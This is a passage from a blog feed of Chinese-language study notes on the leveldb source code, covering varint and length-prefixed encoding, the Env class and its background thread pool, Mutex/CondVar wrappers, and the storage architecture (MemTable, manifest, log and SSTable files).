class="keyword">const</span> <span class="keyword">char</span>* limit,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint32_t</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">uint32_t</span> shift = <span class="number">0</span>; shift &lt;= <span class="number">28</span> &amp;&amp; p &lt; limit; shift += <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">byte</span> = *(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">uint8_t</span>*&gt;(p));</span><br><span class="line">    p++;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">byte</span> &amp; <span class="number">128</span>) &#123;<span class="comment">// 后续还有字节</span></span><br><span class="line">      <span class="comment">// More bytes are present</span></span><br><span class="line">      result |= ((<span class="keyword">byte</span> &amp; <span class="number">127</span>) &lt;&lt; shift);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 后续无字节，到了最后的字节</span></span><br><span class="line">      result |= (<span class="keyword">byte</span> &lt;&lt; shift);</span><br><span class="line">      *value = result;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(p);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便用户使用，leveldb还封住了一个Put函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PutVarint32</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>* dst, <span class="keyword">uint32_t</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">char</span>* ptr = EncodeVarint32(buf, v);</span><br><span class="line">  dst-&gt;append(buf, ptr - buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先申请了一个5字节的buf，用来存储编码后的结果。为什么是5个字节？因为当32位的数值过大，比如 0xffffffff， 那么变长编码肯定需要5个字节才能表示。后面就很简单那了，执行编码，将编码结果保存在dst中。</p><h2 id="4-PutLengthPrefixedSlice-amp-GetLengthPrefixedSlice"><a href="#4-PutLengthPrefixedSlice-amp-GetLengthPrefixedSlice" class="headerlink" title="4. PutLengthPrefixedSlice &amp; GetLengthPrefixedSlice"></a>4. PutLengthPrefixedSlice &amp; GetLengthPrefixedSlice</h2><p>Put函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PutLengthPrefixedSlice</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>* dst, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">  PutVarint32(dst, value.<span class="built_in">size</span>());</span><br><span class="line">  dst-&gt;append(value.data(), value.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于一个字符串，这里首先将它的长度放到dst中，然后再将数值放入。 </p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcv57uY5Zu+5paH5Lu2LeesrA==" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第<i class="fa fa-external-link"></i></span> 20 页.png)</p><p>Get函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLengthPrefixedSlice</span><span class="params">(Slice* input, Slice* result)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> len;</span><br><span class="line">  <span class="keyword">if</span> (GetVarint32(input, &amp;len) &amp;&amp; input-&gt;<span class="built_in">size</span>() &gt;= len) &#123;</span><br><span class="line">    *result = Slice(input-&gt;data(), len);</span><br><span class="line">    input-&gt;remove_prefix(len);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的意思相当于将编码后的string中的长度信息去除，提出出原始string。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>本文分析了leveldb中与编码相关的知识，包含了固定长度编码与变长编码的原理与实现。这些内容虽然看似与leveldb无关，但是leveldb内部存储中却无时无刻不用到这些编码，所以我们现在都是在为后续看懂leveldb做铺垫。</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-Env类</title>
      <link href="/archives/c451920b.html"/>
      <url>/archives/c451920b.html</url>
      
        <content type="html"><![CDATA[<p>本系列的前几篇文章并不准备深入到leveldb中的”核心“，而是分析一些leveldb中用到的”杂项“内容，如本文要说的Env类，后面要提到的编码、文件命名方式等。</p><a id="more"></a><h2 id="Env"><a href="#Env" class="headerlink" title="Env"></a>Env</h2><p>Env代表Environment，环境类，在其内部封装了leveldb所有的文件操作和线程调度操作。Env是一个虚基类，具体操作由子类实现，看一下它的继承关系：</p><img data-src="https://pic.downk.cc/item/5f83a9d71cd1bbb86b971527.png" alt="image-20201012085159807" style="zoom: 50%;" /><p>EnvWrapper类主要是供用户自定义一些操作，一般不管，主要看Windows平台和PosixEnv（linux属于这个范围），因为我都是在linux平台上看的，所以这里只用关注PosixEnv。</p><h3 id="构造env"><a href="#构造env" class="headerlink" title="构造env"></a>构造env</h3><p>默认情况下，Env由<code>Env::Default()</code>函数调用创建：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">leveldb/util/env_posix.cc</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> PosixDefaultEnv = SingletonEnv&lt;PosixEnv&gt;;</span><br><span class="line"><span class="function">Env* <span class="title">Env::Default</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> PosixDefaultEnv env_container;</span><br><span class="line">  <span class="keyword">return</span> env_container.env();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Env* <span class="title">env</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Env*&gt;(&amp;env_storage_); &#125;</span><br></pre></td></tr></table></figure><p>Evn.Default调用<code>env_container.env();</code>,  env_container是PosixDefaultEnv类型（PosixDefaultEnv是SingletonEnv<PosixEnv>的别名), env返回<code>env_storage</code>.</p><p>关于env_storage，这个变量在SingletonEnv类中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用于字节对齐，这里表示env_storage_按照EnvType的大小对齐，同时自身的大小也是env_storage_</span></span><br><span class="line"><span class="keyword">typename</span> <span class="built_in">std</span>::aligned_storage&lt;<span class="keyword">sizeof</span>(EnvType), <span class="keyword">alignof</span>(EnvType)&gt;::type</span><br><span class="line">      env_storage_;</span><br><span class="line"></span><br><span class="line"><span class="comment">// env_storage_在PosixDefaultEnv的构造函数中被初始化：</span></span><br><span class="line"><span class="keyword">new</span> (&amp;env_storage_) EnvType();<span class="comment">// 这句话的意思是，按照EvnType的大小申请一个对象，然后将这个对象填充到env_storage_的地址空间中去。</span></span><br></pre></td></tr></table></figure><p>最后的默认环境为 <strong>PosixEnv类</strong>, 看一下它的类图：</p><img data-src="https://pic.downk.cc/item/5f633eec160a154a67e8687e.png" alt="image-20200916170716873" style="zoom: 50%;" /><p>可以看到都是一些辅助函数，包括文件创建，监测，线程管理（同步）等。文件的相关操作比较简单，我们说一下线程池的实现：</p><h3 id="线程池、队列"><a href="#线程池、队列" class="headerlink" title="线程池、队列"></a>线程池、队列</h3><p>线程池的实现中有一个工作队列，队列中放的都是需要被线程执行的任务。工作队列由<code>background_work_queue_</code>表示，任务则由<code>BackgroundWorkItem</code>表示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 队列</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">queue</span>&lt;BackgroundWorkItem&gt; background_work_queue_</span><br><span class="line">      GUARDED_BY(background_work_mutex_);</span><br><span class="line">      </span><br><span class="line"><span class="comment">// work item</span></span><br><span class="line"><span class="comment">// Stores the work item data in a Schedule() call.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Instances are constructed on the thread calling Schedule() and used on the</span></span><br><span class="line"><span class="comment">// background thread.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This structure is thread-safe beacuse it is immutable.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BackgroundWorkItem</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">BackgroundWorkItem</span><span class="params">(<span class="keyword">void</span> (*function)(<span class="keyword">void</span>* arg), <span class="keyword">void</span>* arg)</span></span></span><br><span class="line">        : function(function), arg(arg) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*<span class="keyword">const</span> function)(<span class="keyword">void</span>*);</span><br><span class="line">    <span class="keyword">void</span>* <span class="keyword">const</span> arg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如何调度一个线程？看Schedule函数，<em>目前看来线程池中只有一个线程</em>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PosixEnv::Schedule</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">void</span> (*background_work_function)(<span class="keyword">void</span>* background_work_arg),</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">void</span>* background_work_arg)</span> </span>&#123;</span><br><span class="line">  background_work_mutex_.Lock();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Start the background thread, if we haven't done so already.</span></span><br><span class="line">  <span class="keyword">if</span> (!started_background_thread_) &#123;<span class="comment">// 首次执行，开启线程</span></span><br><span class="line">    started_background_thread_ = <span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">background_thread</span><span class="params">(PosixEnv::BackgroundThreadEntryPoint, <span class="keyword">this</span>)</span></span>;</span><br><span class="line">    background_thread.<span class="built_in">detach</span>();<span class="comment">// detach模式，由内核去回收</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the queue is empty, the background thread may be waiting for work.</span></span><br><span class="line">  <span class="keyword">if</span> (background_work_queue_.empty()) &#123;</span><br><span class="line">    background_work_cv_.Signal();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  background_work_queue_.emplace(background_work_function, background_work_arg);</span><br><span class="line">  background_work_mutex_.Unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重点看下唤醒消费者的代码，注意这里Signal后，消费者的线程虽然被唤醒，但是依然处于阻塞状态，只有当前线程，调用 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background_work_mutex_.Unlock();</span><br></pre></td></tr></table></figure><p>后，消费者线程才能正常执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If the queue is empty, the background thread may be waiting for work.</span></span><br><span class="line"><span class="keyword">if</span> (background_work_queue_.empty()) &#123;</span><br><span class="line">background_work_cv_.Signal();</span><br><span class="line">&#125;</span><br><span class="line">background_work_queue_.emplace(background_work_function, background_work_arg);<span class="comment">// 插入一个任务</span></span><br><span class="line">background_work_mutex_.Unlock();</span><br></pre></td></tr></table></figure><p>所以只有当真正插入一个任务后，线程才正式执行。</p><p>如果第一次调度，则首先启动线程, 线程执行的函数为<code>BackgroundThreadEntryPoint:</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BackgroundThreadEntryPoint</span><span class="params">(PosixEnv* env)</span> </span>&#123;</span><br><span class="line">    env-&gt;BackgroundThreadMain();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PosixEnv::BackgroundThreadMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    background_work_mutex_.Lock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until there is work to be done.</span></span><br><span class="line">    <span class="keyword">while</span> (background_work_queue_.empty()) &#123;</span><br><span class="line">      background_work_cv_.Wait();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 取出任务</span></span><br><span class="line">    assert(!background_work_queue_.empty());</span><br><span class="line">    <span class="keyword">auto</span> background_work_function = background_work_queue_.front().function;</span><br><span class="line">    <span class="keyword">void</span>* background_work_arg = background_work_queue_.front().arg;</span><br><span class="line">    background_work_queue_.pop();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 执行</span></span><br><span class="line">    background_work_mutex_.Unlock();</span><br><span class="line">    background_work_function(background_work_arg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="互斥量Mutex和条件变量CondVar"><a href="#互斥量Mutex和条件变量CondVar" class="headerlink" title="互斥量Mutex和条件变量CondVar"></a>互斥量Mutex和条件变量CondVar</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LOCKABLE</span> <span class="title">Mutex</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  Mutex() = <span class="keyword">default</span>;</span><br><span class="line">  ~Mutex() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">  Mutex(<span class="keyword">const</span> Mutex&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  Mutex&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Mutex&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Lock</span><span class="params">()</span> <span class="title">EXCLUSIVE_LOCK_FUNCTION</span><span class="params">()</span> </span>&#123; mu_.lock(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Unlock</span><span class="params">()</span> <span class="title">UNLOCK_FUNCTION</span><span class="params">()</span> </span>&#123; mu_.unlock(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AssertHeld</span><span class="params">()</span> <span class="title">ASSERT_EXCLUSIVE_LOCK</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">CondVar</span>;</span></span><br><span class="line">  <span class="built_in">std</span>::mutex mu_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Mutex就是对标准mutex的封装，同时用了些宏来修饰，这些宏是clang用于 语法分析（猜想） 的宏，如这里的 ASSERT_EXCLUSIVE_LOCK， 表示调用AssertHeld函数时，表示必须是在获取独占lock的情况下，才能执行之后的代码。比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::Recover</span><span class="params">(VersionEdit* edit, <span class="keyword">bool</span>* save_manifest)</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br></pre></td></tr></table></figure><p>DBImpl::Recover函数的第一行代码就是表示该函数必须在本线程获取独占锁的情况下执行。</p><p>下面再看看条件变量，CondVar：</p><p>条件变量只是对std::condition_variable的浅封装：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Thinly wraps std::condition_variable.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CondVar</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">CondVar</span><span class="params">(Mutex* mu)</span> : <span class="title">mu_</span><span class="params">(mu)</span> </span>&#123; assert(mu != <span class="literal">nullptr</span>); &#125;</span><br><span class="line">  ~CondVar() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">  CondVar(<span class="keyword">const</span> CondVar&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  CondVar&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> CondVar&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Wait</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::unique_lock&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lock</span><span class="params">(mu_-&gt;mu_, <span class="built_in">std</span>::adopt_lock)</span></span>;</span><br><span class="line">    cv_.wait(lock);</span><br><span class="line">    lock.<span class="built_in">release</span>();<span class="comment">// 断开lock和mutex的关联，不释放mutex</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Signal</span><span class="params">()</span> </span>&#123; cv_.notify_one(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SignalAll</span><span class="params">()</span> </span>&#123; cv_.notify_all(); &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">std</span>::condition_variable cv_;</span><br><span class="line">  Mutex* <span class="keyword">const</span> mu_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文解释了leveldb中Env类的作用，并分析了内部线程池的实现，下文我们将说一下leveldb内的编码。</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-整体架构</title>
      <link href="/archives/1a545f48.html"/>
      <url>/archives/1a545f48.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>本系列文章是对leveldb源码分析的笔记，基本会包含leveldb中的方方面面。阅读过程中，参照网上各博客并加上了个人的理解，所以难免有错，如有错误还请告知。</p><p>如果你是刚开始看leveldb，我希望你对LSM有一定的概念。为了避免过度陷入代码细节，本文将解释leveldb的整体设计架构，各个组件的宏观设计，这样能在心里对leveldb有个轮廓，也能指导我们从哪里入手代码。</p><p>本文非写者编辑，转载自：<span class="exturl" data-url="aHR0cDovL2NpZ2hhby5jb20vMjAxNi8wOC8xNC9sZXZlbGRiLXNvdXJjZS1hbmFseXNpcy0wMi1zdHJ1Y3R1cmUv" title="http://cighao.com/2016/08/14/leveldb-source-analysis-02-structure/">http://cighao.com/2016/08/14/leveldb-source-analysis-02-structure/<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="1-整体架构"><a href="#1-整体架构" class="headerlink" title="1. 整体架构"></a>1. 整体架构</h2><p>LevelDB 作为存储系统，数据记录的存储介质包括内存以及磁盘文件，当 LevelDB 运行了一段时间，此时我们给 LevelDB 进行透视拍照，会看到如下一番景象，这也就是 LevelDB 的结构图。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-01.png" alt="LevelDB结构"></p><p>从图中可以看出，构成 LevelDB 静态结构的包括六个主要部分：内存中的 <strong>MemTable</strong> 和 <strong>Immutable MemTable</strong> 以及磁盘上的几种主要文件：<strong>Current文件</strong>，<strong>Manifest文件</strong>，<strong>log文件</strong>以及 <strong>SSTable 文件</strong>。当然，LevelDB 除了这六个主要部分还有一些辅助的文件，但是以上六个文件和数据结构是 LevelDB 的主体构成元素。</p><p>当应用写入一条Key:Value记录的时候，LevelDb会先往log文件里写入，成功后将记录插进Memtable中，这样基本就算完成了写入操作，因为一次写入操作只涉及一次磁盘顺序写和一次内存写入，所以这是为何说LevelDb写入速度极快的主要原因。</p><p>SSTable 就是由内存中的数据不断导出并进行 Compaction 操作后形成的，而且 SSTable 的所有文件是一种层级结构，第一层为Level 0，第二层为Level 1，依次类推，层级逐渐增高。</p><p>SSTable 中的文件(后缀为.sst)是 key 有序的，就是说在文件中小 key 记录排在大 key 记录之前，除了 level 0，各个 level 的 SSTable 都是如此。</p><h2 id="2-manifest文件"><a href="#2-manifest文件" class="headerlink" title="2. manifest文件"></a>2. manifest文件</h2><p>SSTable 中的某个文件属于特定层级，而且其存储的记录是 key 有序的，那么必然有文件中的最小 key 和最大 key，这是非常重要的信息，LevelDB 应该记下这些信息。<strong>manifest</strong> 就是干这个的，它记载了 SSTable 各个文件的管理信息，比如属于哪个 level，文件名称叫啥，最小 key 和最大 key 各自是多少。下图是 manifest 所存储内容的示意：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-02.png" alt="Manifest存储示意图"></p><p>图中只显示了两个文件（manifest 会记载所有 SSTable 文件的这些信息），即 level 0 的 Test1.sst 和 Test2.sst 文件，同时记载了这些文件各自对应的 key 范围，比如 Test1.sst 的 key 范围是 “abc” 到 “hello”，而文件 Test2.sst 的 key 范围是 “bbc” 到 “world”，可以看出两者的 key 范围是有重叠的。</p><h2 id="3-current-文件"><a href="#3-current-文件" class="headerlink" title="3. current 文件"></a>3. current 文件</h2><p>这个文件的内容只有一个信息，就是记载当前的 manifest 文件名。因为在 LevleDB 的运行过程中，随着 compaction 的进行，SSTable 文件会发生变化，会有新的文件产生，老的文件被废弃，manifest 也会跟着反映这种变化，此时往往会新生成 manifest 文件来记载这种变化，而 current 则用来指出哪个 manifest 文件才是我们关心的那个 manifest文件。</p><h2 id="4-log-文件"><a href="#4-log-文件" class="headerlink" title="4. log 文件"></a>4. log 文件</h2><p>log 文件在 LevelDB 中的主要作用是系统故障恢复时，能够保证不会丢失数据。因为在将记录写入内存的 memtable 之前，会先写入 log 文件，这样即使系统发生故障，memtable 中的数据没有来得及 dump 到磁盘的 SSTable 文件，LevelDB 也可以根据 log 文件恢复内存的 Memtable 数据结构内容，不会造成系统丢失数据。</p><p>LevelDB 对于一个 log 文件，会把它切割成以 32K 为单位的物理 Block，每次读取以一个 Block 作为基本读取单位，下图展示的 log 文件由3个 Block 构成，所以从物理布局来讲，一个 log 文件就是由连续的 32K 大小 Block 构成的。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-03.png" alt="log文件布局"></p><p>log 文件中的数据是以 block 为单位组织，写日志时，处于一致性考虑并没有按 block 单位写，每次更新均对 log 文件进行 IO，每次更新写入作为一个 record，每条 record 的结构如下图所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-04.png" alt="记录结构"></p><p><code>checksum</code> 记录的是 “type” 和 “data” 字段的CRC校验，为了避免处理不完整或者是被破坏的数据，当 LevelDB 读取记录数据时候会对数据进行校验，如果发现和存储的 checksum 相同，说明数据完整无破坏，可以继续后续流程。</p><p><code>length</code> 记录的是 record 内保存的 data 长度(小端对齐)。</p><p><code>data</code> 记录的是 Key:Value 数值对.</p><p><code>type</code> 字段则指出了每条记录的逻辑结构和 log 文件物理分块结构之间的关系，具体而言，主要有以下四种类型：<code>FULL</code>, <code>FIRST</code>, <code>MIDDLE</code>, <code>LAST</code>。如果记录类型是FULL，代表了当前记录内容完整地存储在一个物理Block里，没有被不同的物理Block切割开；如果记录被相邻的物理Block切割开，则类型会是其他三种类型中的一种。我们以图3.1所示的例子来具体说明。</p><p>假设目前存在三条记录，Record A，Record B 和 Record C，其中 Record A 大小为10K，Record B 大小为80K，Record C大小为12K，那么其在 log 文件中的逻辑布局会如上面的图所示。Record A是图中蓝色区域所示，因为大小为10K&lt;32K，能够放在一个物理Block中，所以其类型为FULL；Record B 大小为80K，而Block 1因为放入了Record A，所以还剩下22K，不足以放下Record B，所以在Block 1的剩余部分放入Record B的开头一部分，类型标识为FIRST，代表了是一个记录的起始部分；Record B还有58K没有存储，这些只能依次放在后续的物理Block里面，因为Block 2大小只有32K，仍然放不下Record B的剩余部分，所以Block 2全部用来放Record B，且标识类型为MIDDLE，意思是这是Record B中间一段数据；Record B剩下的部分可以完全放在Block 3中，类型标识为LAST，代表了这是Record B的末尾数据；图中黄色的Record C因为大小为12K，Block 3剩下的空间足以全部放下它，所以其类型标识为FULL。</p><p>从这个小例子可以看出逻辑记录和物理Block之间的关系，LevelDB一次物理读取为一个Block，然后根据类型情况拼接出逻辑记录，供后续流程处理。</p><h2 id="5-SSTable-文件"><a href="#5-SSTable-文件" class="headerlink" title="5. SSTable 文件"></a>5. SSTable 文件</h2><p>LevelDB 不同层级有很多 SSTable 文件（以后缀.sst为特征），所有 .sst 文件内部布局都是一样的。上节介绍 log 文件是物理分块的，SSTable也一样会将文件划分为固定大小的物理存储块，但是两者逻辑布局大不相同，根本原因是：log文件中的记录是 Key 无序的，即先后记录的 key 大小没有明确大小关系，而 .sst 文件内部则是根据记录的 Key 由小到大排列的。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-05.png" alt=".sst文件的分块结构"></p><p>上图展示了一个 .sst 文件的物理划分结构，同 log 文件一样，也是划分为固定大小的存储块，每个 Block 分为三个部分：<strong>数据存储区</strong>，<strong>Type 区</strong>用于标识数据存储区是否采用了数据压缩算法（Snappy压缩或者无压缩），<strong>CRC校验</strong>则是数据校验码，用于判别数据在生成和传输中是否出错。</p><p>以上是.sst的物理布局，下面介绍.sst文件的逻辑布局，所谓逻辑布局，就是说尽管大家都是物理块，但是每一块存储什么内容，内部又有什么结构等。下图展示了.sst文件的内部逻辑解释。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-06.png" alt="逻辑布局"></p><p>从上图可以看出，从大的方面，可以将 .sst文 件划分为<strong>数据存储区</strong>和<strong>数据管理区</strong>，数据存储区存放实际的 key-value 